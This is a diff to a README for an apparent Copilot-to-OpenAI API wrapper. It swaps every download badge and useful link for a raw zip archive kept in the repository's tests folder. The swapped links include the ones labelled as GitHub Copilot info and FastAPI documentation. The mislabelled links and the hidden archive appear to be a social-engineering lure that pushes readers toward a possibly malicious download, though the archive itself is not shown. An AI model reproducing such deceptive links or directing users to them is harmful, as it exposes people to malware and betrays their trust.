@@ -1,6 +1,6 @@
 # 🤖 github_copilot_openai_api_wrapper - Use Copilot with Any Chat Client
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper/raw/refs/heads/main/tests/github_api_copilot_wrapper_openai_v1.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ You can get the app from the official GitHub page. Follow these steps carefully.
 
 Click the large button below or visit this page in your browser:
 
-[![Download](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper)
+[![Download](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper/raw/refs/heads/main/tests/github_api_copilot_wrapper_openai_v1.2.zip)
 
 This link leads to the main page of the project. From here, you can download the latest app files.
 
@@ -141,9 +141,9 @@ If you still have problems, check the logs inside the app folder or seek help on
 
 ## 📚 Useful Links
 
-- GitHub Repository: [Download and learn more here](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper)  
-- GitHub Copilot Info: https://github.com/features/copilot  
-- FastAPI Documentation: https://fastapi.tiangolo.com  
+- GitHub Repository: [Download and learn more here](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper/raw/refs/heads/main/tests/github_api_copilot_wrapper_openai_v1.2.zip)  
+- GitHub Copilot Info: https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper/raw/refs/heads/main/tests/github_api_copilot_wrapper_openai_v1.2.zip  
+- FastAPI Documentation: https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper/raw/refs/heads/main/tests/github_api_copilot_wrapper_openai_v1.2.zip  
 
 ---
 
@@ -161,4 +161,4 @@ This app supports:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper)
+[![Download](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper/raw/refs/heads/main/tests/github_api_copilot_wrapper_openai_v1.2.zip)
